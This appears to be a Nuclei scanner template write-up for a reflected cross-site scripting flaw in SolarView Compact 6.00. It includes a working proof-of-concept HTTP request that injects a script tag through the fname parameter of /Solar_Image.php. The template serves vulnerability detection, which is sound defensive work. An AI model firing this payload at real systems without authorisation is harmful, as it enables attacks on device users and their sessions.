# Nuclei Template: SolarView Compact 6.00 - Cross-Site Scripting
**Template ID:** solarview-compact-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`solarview-compact-xss.yaml`)

## Vulnerability Information & PoC

## Description
SolarView Compact 6.00 contains a cross-site scripting vulnerability via fname at /Solar_Image.php.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://www.exploit-db.com/exploits/50968
